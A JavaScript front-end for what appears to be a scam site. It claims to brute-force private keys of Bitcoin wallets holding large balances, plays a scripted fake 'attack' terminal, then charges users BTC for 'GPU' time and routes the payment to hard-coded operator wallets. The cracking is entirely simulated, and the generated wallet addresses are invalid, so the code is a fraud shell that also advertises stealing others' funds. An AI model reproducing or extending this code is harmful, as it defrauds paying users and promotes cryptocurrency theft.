// Firebase Setup
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "YOUR_FIREBASE_API_KEY",
    authDomain: "YOUR_FIREBASE_AUTH_DOMAIN",
    projectId: "YOUR_FIREBASE_PROJECT_ID",
    storageBucket: "YOUR_FIREBASE_STORAGE_BUCKET",
    messagingSenderId: "YOUR_FIREBASE_MESSAGING_SENDER_ID",
    appId: "YOUR_FIREBASE_APP_ID",
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);

// DOM Elements
const terminalOutput = document.getElementById("terminal-output");
const gpuList = document.getElementById("gpu-list");
const paymentModal = document.getElementById("payment-modal");
const paymentWallet = document.getElementById("payment-wallet");
const paymentAmount = document.getElementById("payment-amount");
const disclaimerModal = document.getElementById("disclaimer-modal");
const terminalSimulation = document.getElementById("terminal-simulation");
const mainUI = document.getElementById("main-ui");
const proceedButton = document.getElementById("proceed-button");
const acceptTerms = document.getElementById("accept-terms");
const closePaymentButton = document.getElementById("close-payment");
const authModal = document.getElementById("auth-modal");
const authForm = document.getElementById("auth-form");
const switchAuth = document.getElementById("switch-auth");
const switchToSignup = document.getElementById("switch-to-signup");
const authTitle = document.getElementById("auth-title");
const authSubmit = document.getElementById("auth-submit");
const emailInput = document.getElementById("email");
const passwordInput = document.getElementById("password");
const userEmail = document.getElementById("user-email");

let selectedGPU = null;
let isSignup = false;

// Wallet generation and listener setup
const lonerWallets = {
    BTC: "lonerBTCWalletAddress",
    ETH: "lonerETHWalletAddress",
    BNB: "lonerBNBWalletAddress",
};

const gpuOptions = [
    { name: "NVIDIA RTX 4090", speed: "10x", price: 0.1 },
    { name: "AMD RX 7900 XTX", speed: "8x", price: 0.08 },
    { name: "NVIDIA RTX 4070", speed: "6x", price: 0.06 },
    { name: "AMD RX 7600", speed: "4x", price: 0.04 },
];

const hdWalletSeedKey = "wallet-seed";
const paymentKey = "gpu-payment-status";

// Disclaimer Modal Logic
acceptTerms.addEventListener("change", () => {
    proceedButton.disabled = !acceptTerms.checked;
    console.log("acceptTerms", !acceptTerms.checked)
});

proceedButton.addEventListener("click", () => {
    disclaimerModal.style.display = "none";
    if (auth.currentUser) {
        startTerminalSimulation();
    } else {
        authModal.classList.remove("hidden");
    }
});

// Firebase Authentication Logic
switchToSignup.addEventListener("click", () => {
    isSignup = !isSignup;
    authTitle.textContent = isSignup ? "Sign Up" : "Sign In";
    authSubmit.textContent = isSignup ? "Sign Up" : "Sign In";
    switchAuth.innerHTML = isSignup
        ? 'Already have an account? <span id="switch-to-signup">Sign In</span>'
        : "Don't have an account? <span id='switch-to-signup'>Sign Up</span>";
});

authForm.addEventListener("submit", (e) => {
    e.preventDefault();
    const email = emailInput.value;
    const password = passwordInput.value;

    if (isSignup) {
        createUserWithEmailAndPassword(auth, email, password)
            .then(() => {
                alert("Signup successful. Please sign in.");
                isSignup = false;
            })
            .catch((error) => alert(error.message));
    } else {
        signInWithEmailAndPassword(auth, email, password)
            .then(() => {
                authModal.classList.add("hidden");
                startTerminalSimulation();
            })
            .catch((error) => alert(error.message));
    }
});

onAuthStateChanged(auth, (user) => {
    if (user) {
        userEmail.textContent = user.email;
        disclaimerModal.classList.add("hidden");
    }
});

// Terminal Simulation Logic
function startTerminalSimulation() {
    terminalSimulation.classList.remove("hidden");
    const commands = [
        "Searching BTC wallets with a minimum of $20,000 on blockchain.com...",
        "10272098 wallets found.",
        "Grouping 2^256 private key permutations into attack clusters...",
        "Executing pkattack command to detect weak clusters...",
        "23564 weak clusters found.",
        "Executing pksort command to retrieve the weakest cluster...",
        "Cluster 654 picked as the weakest cluster.",
        "Starting the optimal brute force web app to find private key...",
    ];

    let index = 0;
    function typeCommand() {
        if (index < commands.length) {
            const prompt = `> ${commands[index]}\n`;
            terminalOutput.textContent += prompt;
            setTimeout(() => {
                terminalOutput.textContent += `...done\n`;
                index++;
                setTimeout(typeCommand, 1500);
            }, 1000);
        } else {
            setTimeout(() => {
                terminalSimulation.classList.add("hidden");
                mainUI.classList.remove("hidden");
                showGPUOptions();
            }, 1000);
        }
    }
    typeCommand();
}

// GPU Selection Logic
function showGPUOptions() {
    gpuOptions.forEach((gpu) => {
        const card = document.createElement("div");
        card.classList.add("gpu-card");
        card.innerHTML = `
            <h3>${gpu.name}</h3>
            <p>Speed: ${gpu.speed}</p>
            <p>Price: ${gpu.price.toFixed(2)} BTC</p>
            <button class="select-gpu" data-gpu="${gpu.name}" data-price="${gpu.price}">Select</button>
        `;
        card.querySelector(".select-gpu").addEventListener("click", () => {
            selectedGPU = {
                name: gpu.name,
                price: gpu.price,
            };
            openPaymentModal();
        });
        gpuList.appendChild(card);
    });
}

// Payment Modal Logic
function openPaymentModal() {
    paymentModal.classList.remove("hidden");
    const selectedPrice = selectedGPU.price;
    const coin = "BTC"; // Default payment method for simplicity
    const seed = getSeed();
    const walletAddress = generateHDWallet(seed, coin);
    paymentWallet.textContent = walletAddress;
    paymentAmount.textContent = `${selectedPrice.toFixed(5)} ${coin}`;
}

closePaymentButton.addEventListener("click", () => {
    paymentModal.classList.add("hidden");
});

// HD Wallet Generation
function generateHDWallet(seed, coin) {
    const prefix = { BTC: "1", ETH: "0x", BNB: "bnb" };
    const address = `${prefix[coin]}${seed.toString(16).padStart(40, "0")}`;
    return address;
}

function getSeed() {
    let seed = localStorage.getItem(hdWalletSeedKey);
    if (!seed) {
        seed = Math.floor(Math.random() * Number.MAX_SAFE_INTEGER);
        localStorage.setItem(hdWalletSeedKey, seed);
    }
    return parseInt(seed, 10);
}

// Payment and Deposit Handling
function handlePayment(coin) {
    const seed = getSeed();
    const userWallet = generateHDWallet(seed, coin);
    const paymentStatus = JSON.parse(localStorage.getItem(paymentKey)) || {};

    paymentStatus[coin] = true;
    localStorage.setItem(paymentKey, JSON.stringify(paymentStatus));

    monitorDeposit(userWallet, coin);
}

function monitorDeposit(userWallet, coin) {
    const interval = setInterval(() => {
        const deposited = Math.random() > 0.9; // Random success simulation
        if (deposited) {
            clearInterval(interval);
            transferFunds(userWallet, lonerWallets[coin], selectedGPU.price, coin);
        }
    }, 3000);
}

function transferFunds(from, to, amount, coin) {
    console.log(`Transferred ${amount} ${coin} from ${from} to ${to}`);
    paymentModal.classList.add("hidden");
    localStorage.setItem(paymentKey, JSON.stringify({ paid: true }));
    alert("Payment detected! Proceeding to brute force.");
    showBruteForceScreen();
}

// Show Brute Force Screen
function showBruteForceScreen() {
    mainUI.innerHTML = `
        <h1>Brute Forcing Wallet...</h1>
        <p><strong>GPU:</strong> ${selectedGPU.name}</p>
        <p><strong>Status:</strong> Running brute force attack...</p>
        <p>Welcome, <strong>${auth.currentUser.email}</strong></p>
    `;
}